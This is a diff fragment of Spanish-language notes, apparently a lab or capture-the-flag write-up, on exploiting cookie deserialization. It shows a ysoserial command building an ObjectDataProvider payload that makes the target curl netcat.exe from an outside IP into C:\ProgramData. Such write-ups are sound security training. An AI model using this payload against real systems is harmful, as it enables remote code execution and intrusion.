@@ -148,12 +148,12 @@ viendo esto puedo pensar el realizar una Deseralización de las cookies del perf
 ![[Pasted image 20240714145130.png]]
 
 ### Windows machine
-
+desde nuestra maquina win descargamos la herramienta [ysoserial]()
 ```python
 .\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c curl 10.13.14.7/netcat.exe -o C:\ProgramData\netcat.exe"
 ```
 
-
+![[Pasted image 20240714150450.png]]
 
 
 
